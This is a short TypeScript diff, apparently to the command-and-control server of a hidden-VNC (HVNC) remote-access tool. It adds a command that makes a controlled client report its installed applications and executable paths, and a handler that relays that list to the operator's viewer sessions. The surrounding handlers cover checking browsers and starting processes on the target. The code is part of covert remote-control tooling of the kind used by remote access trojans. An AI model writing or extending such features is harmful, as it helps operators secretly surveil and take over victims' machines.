@@ -632,6 +632,26 @@ export function handleHVNCBrowserCheckResult(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCInstalledAppsResult(clientId: string, payload: any) {
+  const apps: Array<{ name: string; exePath: string; icon: string }> = [];
+  if (Array.isArray(payload.apps)) {
+    for (const app of payload.apps) {
+      apps.push({
+        name: String(app.name || ""),
+        exePath: String(app.exePath || ""),
+        icon: String(app.icon || ""),
+      });
+    }
+  }
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_installed_apps_result",
+      apps,
+      done: !!payload.done,
+    });
+  }
+}
+
 export function handleHVNCDXGIStatus(clientId: string, payload: any) {
   for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
@@ -879,6 +899,9 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       break;
     case "hvnc_browser_check":
       sendHVNCCommand(target, "hvnc_browser_check", {});
+      break;
+    case "hvnc_installed_apps":
+      sendHVNCCommand(target, "hvnc_installed_apps", {});
       break;
     case "hvnc_start_process":
       sendHVNCCommand(target, "hvnc_start_process", {
